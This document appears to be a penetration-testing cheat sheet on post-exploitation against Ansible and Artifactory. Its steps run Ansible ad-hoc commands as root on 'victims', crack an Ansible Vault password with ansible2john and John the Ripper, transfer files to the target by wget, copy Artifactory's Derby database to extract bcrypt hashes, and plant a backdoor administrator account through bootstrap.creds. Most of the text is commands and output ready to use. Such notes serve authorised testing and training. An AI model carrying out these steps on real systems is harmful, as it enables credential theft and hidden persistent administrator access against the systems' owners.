# Ansible


To know if our target use Ansible or not, we can just run the "ansible" command.

Or we can check if the /etc/ansible filepath exist, or the presence of "ansible" related usernames in /etc/passwd.

We might also check for the list of home folders, which may give away whether a user account exists for performing Ansible actions.

It may also be possible to detect Ansible-related log messages in the system's syslog file.

## Table of Contents

* [Interesting files](#Interesting)
* [Ad-hoc Commands](#Ad-Hoc)
* [Ansible Playbooks](#Playbooks)
* [Cracking Ansible Vault key](#CrackVaultKey)
* [Artifactory - Enumeration](#A-Enum)
* [Artifactory - Compromising Backup](#A-Backup)
* [Artifactory - Compromising Databases](#A-Databases)
* [Artifactory - Adding a Secondary Admin Account](#A-AddAdmin)

## Interesting files<a name="Interesting"></a>

```bash
/etc/ansible/hosts # Contains Ansible Hosts
/opt/ansible/webserver.yaml # Contains Ansible vault
/opt/playbooks/script.yml # Playbooks
```

## Ad-hoc Commands<a name="Ad-Hoc"></a>

Ad-hoc commands are simple shell commands to be run on all, or a subset, of machines in the Ansible inventory.

They're called "ad-hoc" because they're not part of a playbook (which scripts actions to be repeated).

Typically, ad-hoc commands would be fore one-off situations where we would want to run a command on multiple servers.

For example :

```
ansible victims -a "whoami"
```

If we want to run a command as root or a different user, we can use the --become parameter.

```
ansible victims -a "whoami" --become root
```

## Ansible Playbooks<a name="Playbooks"></a>

Playbooks allow sets of tasks to be scripted so they can be run routinely at points in time.

Playbooks are written using the YAML markup language.

Playbooks are stored in /opt/playbooks/script.yml

An example of script which will retrieve victim's hostname and Linux distribution type :

```YAML

---
-	name : Get system info
	hosts : all
	gather_facts: true
	tasks:
		- name: Display info
		  debug:
		  	msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

```

Save it to /opt/playbooks/getinfo.yml

```
ansible-playbook /opt/playbooks/getinfo.yml
```

Playbooks can also include a "become: yes" line if we want the scripts to be run as root. Alternatively, we can include a username "become_user: username" if we want to run as someone else.

## Cracking Ansible Vault key<a name="CrackVaultKey"></a>

1. Copy the Ansible vault hash to a file in our kali box.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ cat ansiblehash.yml         
$ANSIBLE_VAULT;1.1;AES256
85749358902385290352387534692304572903837348529753875298573289572385798237528933
84958439658349058390485204372893781012847285320927384990128438756092350389501789
47389948729578375928750238297952387527308957302860238769523759086237823302723838
57298738895782350931753892579023897509372807230502739082709375032709570397923079
47389948728738375928759378297959407527334898302860238769523759086237
```

2. Use ansible2john to convert the hash in a cracking format.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ python /usr/share/john/ansible2john.py ansiblehash.yml > crackme.txt
   
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ cat crackme.txt    
ansiblehash.yml:$ansible$0*0*fe73d35cab482b4925e4898e6d7cd4150e6fac64bb148f5975ede38402a01528*164531331b5e08326cb2eaa1c94b14bed942d7f8d03c07fe4ef139c3682a1e7d*2c41668638e237e7288408978181cacd68c1a120ed27d32fda23906f8f5148f8
```

3. Crack the key using john.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt
```

Now that we retrieve the vault password. We can upload the ansible vault hash on the CB3 box, and decrypt the vault content using ansible-vault and the cracked password.

4. Start a SimpleHTTPServer where the ansible hash is stored in our kali.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ python -m SimpleHTTPServer 443                                      
Serving HTTP on 0.0.0.0 port 443 ...
```

5. Then download it inside the target box.

```bash
target@sinhack2:~$ wget http://192.168.x.x:443/ansiblehash.yml
```

6. Decrypt the vault using ansible-vault and the previous cracked password.

```bash
target@sinhack2:~$ cat ansiblehash.yml | ansible-vault decrypt
cat ansiblehash.yml | ansible-vault decrypt
Vault password: sup3rp@ssw0rd5

Hello word,

The secret key is :

SuperSecretInsideTheVault28193

Decryption successful
```

## Artifactory - Enumeration<a name="A-Enum"></a>

To know if there is any Artifactory repositoring running run the command bellow :

```bash
ps aux | grep artifactory
```

If we've not yet gained access to the machine, we can try accessing the server externally from a web browser at port 8081, which is default port for Artifactory's web interface.

## Artifactory - Compromising Backups<a name="A-Backup"></a>

Artifactory creates backups of its databases (depending on the configuration).

The open-source version of Artifactory creates database backups for the user accounts at /(ARTIFACTORY FOLDER)/var/backup/access in JSON format.

These files have full entries for each user along with their passwords hashed in bcrypt format.

We can copy the bcrypt hashes to our Kali VM, place them in a text file, and use JTR or Hashcat to try and crack them.

### Artifactory - Compromising Databases<a name="A-Databases"></a>

The open-source version of Artifactory we're using locks its Derby database while the server is running.

We could attempt to remove the locks and access the database directly to inject users, but this is risky and often leads to corrupted databases.

A safer option is to copy the entire database to a new location.

In our example, the database is located at /opt/jfrog/artifactory/var/data/access/derby

1. Copy the database and remove any lock files that exist

```bash
v0lk3n@l1nux:~$ mkdir /tmp/hackeddb

v0lk3n@l1nux:~$ sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb

v0lk3n@l1nux:~$ sudo chmod 755 /tmp/hackeddb/derby

v0lk3n@l1nux:~$ sudo rm /tmp/hackeddb/derby/*.lck
```

2. Use Derby connection utilities and connect to our database

```bash
v0lk3n@l1nux:~$ sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
ij version 10.15
ij> connect 'jdbc:derby:/tmp/hackeddb/derby';
ij>
```

The first part of the command calls the embedded version of Java included as part of Artifactory. We’re specifying that we want to run the derbyrun.jar JAR file. The ij parameter indicates that we want to use Apache’s ij 873 tool to access the database.

3. List the users in the system

```bash
ij> select * from access_users;
```

The command selects all records from the access_users table, which holds the user records for the Artifactory system.

Each record includes the bcrypt-hashed passwords of the users we found earlier in our database backup file approach. 

We can crack the hashes using Hashcat or John the Ripper on our Kali VM.

## Artifactory - Adding a Secondary Admin Account<a name="A-AddAdmin"></a>

We can also gain access to Artifactory by adding a secondary administrator account through a built-in backdoor.

This method requires write access to the /opt/jfrog/artifactory/var/etc/access folder and the ability to change permissions on the newly-created file, which usually requires root or sudo access.

1. Navigate to /opt/jfrog/artifactory/var/etc/access folder and create a file through sudo called bootstrap.creds with the following content :

```bash
cd /opt/jrog/artifactory/var/etc/access

sudo nano bootstrap.creds

haxmin@*=haxhaxhax
```

This will create a new user called "haxmin" with a password of "haxhaxhax". 

2. Chmod the file to 600

```bash
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
```

3. Restart Artifactory process.

```bash
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop

sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```

During the restart stage, Artifactory will load our bootstrap credential file and process the new user. 

We can verify this by examining the /opt/jfrog/artifactory/var/log/console.log file for the string “Create admin user”.

4. Once artifactory is running again, we can log in with our newly-created account.

